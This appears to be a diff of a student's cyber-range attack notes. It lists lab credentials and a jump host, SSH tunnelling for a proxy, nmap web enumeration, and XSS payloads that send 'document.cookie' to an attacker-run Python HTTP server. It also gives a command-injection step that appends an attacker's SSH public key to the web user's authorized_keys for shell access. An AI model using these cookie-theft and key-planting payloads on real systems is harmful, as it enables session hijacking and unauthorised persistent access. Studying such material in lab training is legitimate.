@@ -5,7 +5,8 @@ RUBY PING SWEEP
 Stack Number	Username	    Password	        jump
 4 	            TYCO-503-M 	    YdAHv92QJMCMNcE 	10.50.41.0
 
-
+192.168.65.10, 10.50.33.177 (WINDOWS)
+192.168.65.20, 10.50.38.49 (LINUX)
 ------------------------------------------------------------------------------------------------------------------------
 ssh -MS /tmp/jump student@10.50.39.25
 ssh -S /tmp/jump dummy -O forward -D9050
@@ -24,21 +25,37 @@ nmap --script=http-enum.nse <ip address>
     if you see robots.txt, go to it in url
 <ip address>/robots.txt
 
+create web server on yourself and download cookies
+	python3 -m http.server
+	document.location="http://10.50.38.49:8000/"+document.cookie;</script>
 
-python3 -m http.server
-<script>
-	The following examples essentially do the same thing
+uploading ssh to web server
 
-<script>document.location="http://OP-Station-IP:OPS-PORT/?username=" + document.cookie;</script>
-<script>window.location.href="http://website/?"+document.cookie;</script>
-<script>write.location.href="http://10.50.20.97"</script>
+	ssh-keygen -t rsa -b 4096 
+	enter all the way through
+	cat .ssh/id_rsa.pub
+	/var/www/.ssh/authorized_keys
+		make it if its not there already
+	; echo "your key" >> /var/www/.ssh/authorized_keys
+	ssh -i ./ssh/id_rsa www-data@<web server ip address>
 
-Resources:
 
-    https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
 
-    https://en.wikipedia.org/wiki/Content_Security_Policy
 
-document.location="http://<linops ip>:8000/"+document.cookie;</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
